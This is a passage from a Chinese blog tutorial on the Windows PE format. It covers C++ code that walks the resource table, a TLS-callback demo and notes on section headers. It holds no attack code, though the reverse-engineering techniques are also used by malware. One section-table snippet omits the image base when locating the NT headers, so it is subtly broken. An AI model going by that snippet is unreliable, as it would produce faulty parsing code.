class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PATH <span class="meta-string">L&quot;C:\\Users\\SouLinker\\Desktop\\FileCleaner2.0.exe&quot;</span></span></span><br><span class="line"><span class="comment">// 判断是不是PE文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">map</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span>*&gt; g_mapResourceInfo;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*, <span class="keyword">const</span> <span class="keyword">char</span>*&gt; abc;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitResourceInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x1</span>] = <span class="string">&quot;Cursor&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x2</span>] = <span class="string">&quot;BitMap&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x3</span>] = <span class="string">&quot;Icon&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x4</span>] = <span class="string">&quot;Menu&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x5</span>] = <span class="string">&quot;Dialog&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x6</span>] = <span class="string">&quot;String Table&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x7</span>] = <span class="string">&quot;Font Directory&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x8</span>] = <span class="string">&quot;Font&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x9</span>] = <span class="string">&quot;Accelerators&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0xA</span>] = <span class="string">&quot;UnFormatted&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0xB</span>] = <span class="string">&quot;Message Table&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0xC</span>] = <span class="string">&quot;Group Cursor&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0xE</span>] = <span class="string">&quot;Group Icon&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x10</span>] = <span class="string">&quot;Version Information&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="keyword">char</span>* lpImage, DWORD dwRva)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AnalyzeResource</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setlocale(LC_ALL, <span class="string">&quot;chs&quot;</span>);</span><br><span class="line">InitResourceInfo();</span><br><span class="line"><span class="comment">//1 打开文件</span></span><br><span class="line">HANDLE hFile = CreateFile(</span><br><span class="line">PATH,</span><br><span class="line">GENERIC_ALL,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 获取文件大小</span></span><br><span class="line">DWORD dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//3 申请空间并初始化</span></span><br><span class="line"><span class="keyword">char</span>* buf = <span class="keyword">new</span> <span class="keyword">char</span>[dwFileSize] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//4 读取文件</span></span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line">ReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//5 判断是不是PE文件</span></span><br><span class="line"><span class="keyword">if</span> (IsPE_File(buf) == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;这是一个PE文件&quot;);</span></span><br><span class="line">AnalyzeResource(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这不是一个PE文件&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span>[]buf;</span><br><span class="line">buf = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="keyword">char</span>* lpImage, DWORD dwRva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = IMAGE_FIRST_SECTION(pNt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> dwRva;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwRva &gt;= dwSectionRva &amp;&amp; dwRva &lt; dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwFOA = dwRva - dwSectionRva + dwSectionFOA;</span><br><span class="line"><span class="keyword">return</span> dwFOA;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="keyword">if</span> (pDos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNt-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AnalyzeResource</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 找到资源表的结构体</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption =  &amp;pNt-&gt;OptionalHeader;</span><br><span class="line"><span class="comment">//1. 得到了资源表的数据目录</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pResourceDir= &amp;pOption-&gt;DataDirectory[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 得到资源表第一层的位置</span></span><br><span class="line">DWORD dwResourceFOA =  RvaToFoa(lpImage, pResourceDir-&gt;VirtualAddress);</span><br><span class="line">PIMAGE_RESOURCE_DIRECTORY pFirstDir =(PIMAGE_RESOURCE_DIRECTORY)(dwResourceFOA + lpImage);</span><br><span class="line">PIMAGE_RESOURCE_DIRECTORY_ENTRY pFirstRes = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pFirstDir + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//3. 解析资源表</span></span><br><span class="line">DWORD dwFirstCount = pFirstDir-&gt;NumberOfIdEntries + pFirstDir-&gt;NumberOfNamedEntries;</span><br><span class="line"><span class="comment">//3.1 解析第一层</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwFirstCount; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//解析第一层的名称信息</span></span><br><span class="line"><span class="keyword">if</span> (pFirstRes[i].NameIsString == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//以字符串作为标识</span></span><br><span class="line">PIMAGE_RESOURCE_DIR_STRING_U pNameInfo = </span><br><span class="line">(PIMAGE_RESOURCE_DIR_STRING_U)(pFirstRes[i].NameOffset + (DWORD)pFirstDir);</span><br><span class="line">WCHAR* pName = <span class="keyword">new</span> WCHAR[pNameInfo-&gt;Length + <span class="number">1</span>]&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//wcscpy_s(pName, pNameInfo-&gt;Length, pNameInfo-&gt;NameString);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> m = <span class="number">0</span>; m &lt; pNameInfo-&gt;Length; m++)</span><br><span class="line">&#123;</span><br><span class="line">pName[m] = pNameInfo-&gt;NameString[m];</span><br><span class="line">&#125;</span><br><span class="line">wprintf(<span class="string">L&quot;资源种类标识:%s\n&quot;</span>, pName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//以数字作为标识</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (g_mapResourceInfo.count(pFirstRes[i].Id) == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;资源种类标识%s\n&quot;</span>, g_mapResourceInfo[pFirstRes[i].Id]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;资源种类标识%d\n&quot;</span>, pFirstRes[i].Id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解析第一层的位置信息，从而得到第二层</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pFirstRes[i].DataIsDirectory == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//根据偏移得到第二层的位置,以及数组</span></span><br><span class="line">PIMAGE_RESOURCE_DIRECTORY pSecondDir =</span><br><span class="line">(PIMAGE_RESOURCE_DIRECTORY)(pFirstRes[i].OffsetToDirectory + (DWORD)pFirstDir);</span><br><span class="line">PIMAGE_RESOURCE_DIRECTORY_ENTRY pSecondRes =</span><br><span class="line">PIMAGE_RESOURCE_DIRECTORY_ENTRY(pSecondDir + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//第二层的资源个数</span></span><br><span class="line">DWORD dwSecondCount  = </span><br><span class="line">pSecondDir-&gt;NumberOfIdEntries + pSecondDir-&gt;NumberOfNamedEntries;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; dwSecondCount; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//解析第二层的名称信息</span></span><br><span class="line"><span class="keyword">if</span> (pSecondRes[j].NameIsString == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//以字符串作为标识</span></span><br><span class="line">PIMAGE_RESOURCE_DIR_STRING_U pNameInfo =</span><br><span class="line">(PIMAGE_RESOURCE_DIR_STRING_U)(pSecondRes[j].NameOffset + (DWORD)pFirstDir);</span><br><span class="line">WCHAR* pName = <span class="keyword">new</span> WCHAR[pNameInfo-&gt;Length + <span class="number">1</span>]&#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//wcscpy_s(pName, pNameInfo-&gt;Length + 1, pNameInfo-&gt;NameString);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> m = <span class="number">0</span>; m &lt; pNameInfo-&gt;Length; m++)</span><br><span class="line">&#123;</span><br><span class="line">pName[m] = pNameInfo-&gt;NameString[m];</span><br><span class="line">&#125;</span><br><span class="line">wprintf(<span class="string">L&quot;   资源标识:%s\n&quot;</span>, pName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">wprintf(<span class="string">L&quot;   资源标识:%d\n&quot;</span>, pSecondRes[j].Id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解析第二层的位置信息</span></span><br><span class="line"><span class="keyword">if</span> (pSecondRes[j].DataIsDirectory == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//根据偏移得到第三层的位置,以及数组</span></span><br><span class="line">PIMAGE_RESOURCE_DIRECTORY pThirdDir =</span><br><span class="line">(PIMAGE_RESOURCE_DIRECTORY)</span><br><span class="line">(pSecondRes[j].OffsetToDirectory+ (DWORD)pFirstDir);</span><br><span class="line">PIMAGE_RESOURCE_DIRECTORY_ENTRY pThirdRes =</span><br><span class="line">(PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pThirdDir + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//解析第三层，但是不需要循环了</span></span><br><span class="line">PIMAGE_RESOURCE_DATA_ENTRY pData = </span><br><span class="line">(PIMAGE_RESOURCE_DATA_ENTRY)(pThirdRes-&gt;OffsetToData + (DWORD)pFirstDir);</span><br><span class="line"><span class="comment">//pData-&gt;OffsetToData 资源起始位置的RVA</span></span><br><span class="line"><span class="comment">//pData-&gt;Size  资源的大小</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;            资源的起始RVA：%x  资源的大小：%x\n&quot;</span>, pData-&gt;OffsetToData, pData-&gt;Size);</span><br><span class="line"><span class="comment">//获取到资源的数据了，输出10个字节，用于对比</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* pRes = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)</span><br><span class="line">(RvaToFoa(lpImage, pData-&gt;OffsetToData) + lpImage);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;            &quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> m= <span class="number">0</span>; m &lt; <span class="number">10</span>; m++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x  &quot;</span>, pRes[m]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TLS表"><a href="#TLS表" class="headerlink" title="TLS表"></a>TLS表</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>线程局部存储：可以将TLS全局变量，在每一个线程中都创建一份，从而解决一定的线程同步问题。</p><h4 id="测试代码-3"><a href="#测试代码-3" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 03_TLS.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"><span class="keyword">int</span> g_nNum1 = <span class="number">100</span>;</span><br><span class="line">_declspec(thread) <span class="keyword">int</span> g_nNum2 = <span class="number">200</span>;<span class="comment">//TLS的全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TLS回调函数A</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> NTAPI <span class="title">t_TlsCallBack_A</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Red)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (DLL_PROCESS_ATTACH == Reason)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i am a  mimidaima!\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (DLL_THREAD_DETACH == Reason) <span class="comment">// 如果线程退出则打印信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;t_TlsCallBack_A -&gt; ThreadDetach!\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// TLS回调函数B</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> NTAPI <span class="title">t_TlsCallBack_B</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Red)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (DLL_THREAD_DETACH == Reason) <span class="comment">// 如果线程退出则打印信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;t_TlsCallBack_B -&gt; ThreadDetach!\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 注册TLS回调函数，&quot;.CRT$XLB&quot;的含义是：</span></span><br><span class="line"><span class="comment">* CRT表明使用C RunTime机制</span></span><br><span class="line"><span class="comment">* X表示标识名随机</span></span><br><span class="line"><span class="comment">* L表示TLS callback section</span></span><br><span class="line"><span class="comment">* B其实也可以为B-Y的任意一个字母</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">PIMAGE_TLS_CALLBACK p_thread_callback[] = &#123;</span><br><span class="line">t_TlsCallBack_A,</span><br><span class="line">t_TlsCallBack_B,</span><br><span class="line"><span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">t_ThreadFun</span><span class="params">(PVOID pParam)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p  &quot;</span>, &amp;g_nNum1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;g_nNum2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p  &quot;</span>, &amp;g_nNum1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;g_nNum2);</span><br><span class="line">HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, t_ThreadFun, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">WaitForSingleObject(hThread, <span class="number">-1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="区段表"><a href="#区段表" class="headerlink" title="区段表"></a>区段表</h2><h3 id="结构体数组"><a href="#结构体数组" class="headerlink" title="结构体数组"></a>结构体数组</h3><p>数组的元素个数由文件头中的NumberOfSection决定。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[<span class="number">0x8</span>];                       <span class="comment">// (1) 区段名</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            DWORD   PhysicalAddress; </span><br><span class="line">            DWORD   VirtualSize;                  <span class="comment">// (2) *区段大小</span></span><br><span class="line"> &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">// (3)区段的RVA地址*</span></span><br><span class="line">    DWORD   SizeOfRawData;<span class="comment">// (4) 文件中的区段对齐大小*</span></span><br><span class="line">    DWORD   PointerToRawData;<span class="comment">// (5) 区段在文件中的偏移*</span></span><br><span class="line">    DWORD   PointerToRelocations;<span class="comment">// (6) 重定位的偏移（OBJ）</span></span><br><span class="line">    DWORD   PointerToLinenumbers;<span class="comment">// (7) 行号表的偏移（调试）</span></span><br><span class="line">    WORD    NumberOfRelocations;<span class="comment">// (8) 重定位项数量（OBJ）</span></span><br><span class="line">    WORD    NumberOfLinenumbers;<span class="comment">// (9) 行号表项数量</span></span><br><span class="line">    DWORD   Characteristics;<span class="comment">// (10) 区段的属性</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><h3 id="怎么找到区段表"><a href="#怎么找到区段表" class="headerlink" title="怎么找到区段表"></a>怎么找到区段表</h3><p>宏：IMAGE_FIRST_SECTION(NT头的地址)</p><p>计算：NT头的地址+0x4+0x14+0xE0</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打开PE文件后，第一个段就是DOS头部</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="comment">//pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收</span></span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;</span><br><span class="line"><span class="comment">//使用IMAGE_FIRST_SECTION这个宏，传图NT头来获取区段表</span></span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = IMAGE_FIRST_SECTION(pNt);</span><br></pre></td></tr></table></figure><h4 id="区段表中的一个元素描述的就是一个区段的信息"><a href="#区段表中的一个元素描述的就是一个区段的信息" class="headerlink" title="区段表中的一个元素描述的就是一个区段的信息"></a>区段表中的一个元素描述的就是一个区段的信息</h4><p>1 Name：区段名</p><p>2 PointerToRawData  在文件中的位置  FOA</p><p>3 SizeOfRawData在文件中的大小</p><p>4 VirtualAddress在内存中的位置      RVA</p><p>5 Misc.VirtualSize:在内存中的大小</p><p>6 Characteristics:区段的属性：可读  可写  可执行。。。。</p><h4 id="区段表中的以下四个字段保存的是什么？"><a href="#区段表中的以下四个字段保存的是什么？" class="headerlink" title="区段表中的以下四个字段保存的是什么？"></a>区段表中的以下四个字段保存的是什么？</h4><p>VirtualAddress：      区段起始位置的RVA</p><p>PointerToRawData：   区段在文件中的起始偏移</p><p>VirtualSize：         区段在内存中的大小（没有对齐）</p><p>SizeOfRawData：     区段在文件中的大小（对齐过的）</p><p>是否VirtualSize 